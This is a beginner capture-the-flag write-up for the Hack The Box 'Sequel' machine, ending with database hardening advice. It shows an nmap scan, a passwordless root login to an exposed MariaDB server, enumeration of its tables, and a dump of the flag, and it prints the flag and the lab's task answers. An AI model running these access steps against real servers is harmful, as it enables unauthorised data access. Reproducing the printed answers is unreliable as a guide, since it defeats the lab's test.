# Hack The Box: Sequel Writeup — Very Easy

> **Difficulty:** Very Easy | **Tier:** Starting Point Tier 1 | **Tags:** MySQL, MariaDB, Reconnaissance, Weak Credentials

Another day, another box! Today we're cracking open a database with zero password protection 😄 Let's dive in 🚀

---

## What is Sequel?

Sequel is a Very Easy difficulty machine from Hack The Box Starting Point Tier 1. It focuses on MySQL/MariaDB database enumeration and teaches you what happens when a database is left exposed to the network with no password. A great box for beginners getting into database hacking.

**Skills covered:**
- Network reconnaissance with Nmap
- MySQL/MariaDB remote access
- Basic SQL queries

---

## Setting Up

Connect to the HTB network using your OpenVPN config file:

```bash
sudo openvpn your-htb-vpn-file.ovpn
```

Then spawn the Sequel machine from the HTB Starting Point page. My target IP was `10.129.97.143`.

---

## Step 1 — Ping the Target

Before doing anything, I always check if the machine is actually reachable:

```bash
ping -c 4 10.129.97.143
```

Got 4 replies back with 0% packet loss. Target is alive. ✅

---

## Step 2 — Nmap Scan

Time to find out what ports are open and what services are running:

```bash
nmap -sVC -T5 10.129.97.143
```

**What these flags do:**
- `-sV` — detect service versions
- `-sC` — run default nmap scripts
- `-T5` — scan as fast as possible

**Result:**

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql
Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
```

Only one port open — **3306**, running **MariaDB**. MariaDB is a community-built fork of MySQL, widely used in web applications.

---

## Step 3 — Try Logging In as Root

MariaDB on port 3306 with no firewall protection is a big red flag. I tried logging in as root with no password:

```bash
mysql -u root -h 10.129.97.143 --ssl=0
```

**Flag breakdown:**
- `-u root` — username is root
- `-h 10.129.97.143` — connect to remote host
- `--ssl=0` — disable SSL since it's not configured

And just like that — we're in. No password required. ✅

This is exactly the kind of misconfiguration that gets real servers compromised.

---

## Step 4 — Enumerate the Databases

Once inside the MariaDB shell, list all available databases:

```sql
show databases;
```

**Output:**
```
htb
information_schema
mysql
performance_schema
```

Three of these (`information_schema`, `mysql`, `performance_schema`) are default system databases in every MySQL installation. The interesting one is **htb** — that's unique to this machine.

---

## Step 5 — Switch to the HTB Database

```sql
use htb;
```

Then list the tables inside:

```sql
show tables;
```

**Output:**
```
config
users
```

Two tables — `config` and `users`. The `config` table looks interesting.

---

## Step 6 — Dump the Config Table

```sql
select * from config;
```

**Output:**

| id | name | value |
|----|------|-------|
| 1 | timeout | 60s |
| 2 | security | default |
| 3 | auto_logon | false |
| 4 | max_size | 2M |
| 5 | **flag** | **7b4bec00d1a39e3dd4e021ec3d915da8** |
| 6 | enable_uploads | false |
| 7 | authentication_method | radius |

Row 5 — flag found! 🎉

---

## Flag

```
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

## What I Learned

This box is simple but the lesson is real. Leaving a database port exposed with no password on the root account is a critical vulnerability. In a real environment this would mean:

- Full access to all data
- Ability to drop or modify tables
- Potential for further exploitation depending on database permissions

**Always:**
- Bind your database to localhost only (`bind-address = 127.0.0.1`)
- Set strong passwords on all database accounts
- Use a firewall to block port 3306 from external access

---

## Task Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | Which TCP port is MySQL running on? | `3306` |
| 2 | What community-developed MySQL version is running? | `MariaDB` |
| 3 | What switch specifies a login username in MySQL client? | `-u` |
| 4 | Which username allows login without a password? | `root` |
| 5 | What SQL symbol displays everything in a table? | `*` |
| 6 | What symbol ends each SQL query? | `;` |
| 7 | What is the fourth database unique to this host? | `htb` |
| 8 | What MySQL command selects a database? | `use` |
| 9 | What MySQL command shows table columns? | `describe` |
| 10 | Which table has a column named flag? | `config` |

---

*Written by [Tharindu Pathmasiri](https://github.com/tharindu-L) — IT Undergraduate | Cybersecurity Enthusiast*
